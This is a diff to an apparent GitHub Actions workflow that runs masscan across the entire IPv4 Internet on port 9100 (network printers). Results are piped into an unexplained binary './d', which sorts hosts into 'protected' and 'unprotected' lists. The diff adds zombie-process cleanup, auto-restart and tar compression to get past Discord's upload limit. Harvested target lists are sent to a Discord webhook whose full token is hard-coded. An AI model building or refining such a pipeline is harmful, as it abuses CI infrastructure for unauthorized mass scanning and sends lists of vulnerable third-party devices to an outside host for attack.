@@ -46,10 +46,13 @@ jobs:
         run: |
           echo "🚀 Starting masscan → d pipeline..."
           
-          # masscan needs sudo for raw sockets
-          # grep extracts just the IP so it pipes cleanly into d
-          # --exclude 255.255.255.255 is required by masscan to scan 0.0.0.0/0
-          nohup sudo bash -c 'masscan -p 9100 --rate 100000 --exclude 255.255.255.255 0.0.0.0/0 | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | ./d' > scanner.log 2>&1 &
+          # wipe any existing zombies
+          sudo pkill -f masscan || true
+          sudo pkill -f './d' || true
+          sleep 2
+          
+          # set -o pipefail ensures the whole pipe dies if one part fails
+          nohup sudo bash -c 'set -o pipefail; masscan -p 9100 --rate 100000 --exclude 255.255.255.255 0.0.0.0/0 | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | ./d' > scanner.log 2>&1 &
           echo $! > scanner.pid
           echo "✅ Scanner started (PID: $(cat scanner.pid))"
           sleep 5
@@ -68,8 +71,14 @@ jobs:
             if ! sudo kill -0 $(cat scanner.pid) 2>/dev/null; then
               echo "⚠️ Scanner died at $(date). Restarting..."
               cat scanner.log
+              
+              # wipe zombies before restart
+              sudo pkill -f masscan || true
+              sudo pkill -f './d' || true
+              sleep 2
+              
               > scanner.log
-              nohup sudo bash -c 'masscan -p 9100 --rate 100000 --exclude 255.255.255.255 0.0.0.0/0 | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | ./d' > scanner.log 2>&1 &
+              nohup sudo bash -c 'set -o pipefail; masscan -p 9100 --rate 100000 --exclude 255.255.255.255 0.0.0.0/0 | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | ./d' > scanner.log 2>&1 &
               echo $! > scanner.pid
             fi
             
@@ -86,11 +95,13 @@ jobs:
               PROT=$(wc -l < protected.txt 2>/dev/null || echo 0)
               UNPROT=$(wc -l < unprotected.txt 2>/dev/null || echo 0)
               
-              curl -s -F "file1=@big.txt" \
-                   -F "file2=@protected.txt" \
-                   -F "file3=@unprotected.txt" \
+              # zip files to bypass discord 10mb limit
+              tar -czf update.tar.gz big.txt protected.txt unprotected.txt 2>/dev/null || true
+              
+              curl -s -F "file1=@update.tar.gz" \
                    -F "payload_json={\"content\":\"📊 **5-Min Update [${UPTIME_MIN}m]**\n> big.txt: $BIG lines\n> protected.txt: $PROT lines\n> unprotected.txt: $UNPROT lines\"}" \
                    "$WEBHOOK"
+              rm -f update.tar.gz
             fi
             
             sleep 2
@@ -102,30 +113,23 @@ jobs:
         run: |
           WEBHOOK="https://discord.com/api/webhooks/1552599497895452712/EySoc-KqZAfDZ8_Y33aIBDXdPH07H9fW-ko13fAjHeG8mkLwDqE87SKvw1OKsrBbrEPG"
           
-          send_file() {
-            local file="$1"
-            local msg="$2"
-            if [ -f "$file" ] && [ -s "$file" ]; then
-              echo "📤 Sending $file ($(wc -c < "$file") bytes)..."
-              curl -s -F "file1=@$file" -F "payload_json={\"content\":\"$msg\"}" "$WEBHOOK"
-            else
-              echo "⚠️ $file not found or empty"
-              curl -H "Content-Type: application/json" \
-                   -X POST \
-                   -d "{\"content\":\"⚠️ $msg — file not found or empty\"}" \
-                   "$WEBHOOK"
-            fi
-          }
+          # zip final files
+          tar -czf final_results.tar.gz big.txt protected.txt unprotected.txt 2>/dev/null || true
           
-          send_file "big.txt" "📦 **big.txt** FINAL results:"
-          sleep 2
-          send_file "protected.txt" "🔒 **protected.txt** FINAL results:"
-          sleep 2
-          send_file "unprotected.txt" "🔓 **unprotected.txt** FINAL results:"
+          if [ -f "final_results.tar.gz" ] && [ -s "final_results.tar.gz" ]; then
+            echo "📤 Sending final_results.tar.gz..."
+            curl -s -F "file1=@final_results.tar.gz" -F "payload_json={\"content\":\"📦 **FINAL results archive:**\"}" "$WEBHOOK"
+          else
+            curl -H "Content-Type: application/json" \
+                 -X POST \
+                 -d "{\"content\":\"⚠️ No final results generated\"}" \
+                 "$WEBHOOK"
+          fi
 
       - name: 🛑 Kill scanner
         run: |
-          sudo kill $(cat scanner.pid) 2>/dev/null || true
+          sudo pkill -f masscan || true
+          sudo pkill -f './d' || true
           echo "✅ Scanner stopped"
 
       - name: 💾 Save backup (git)
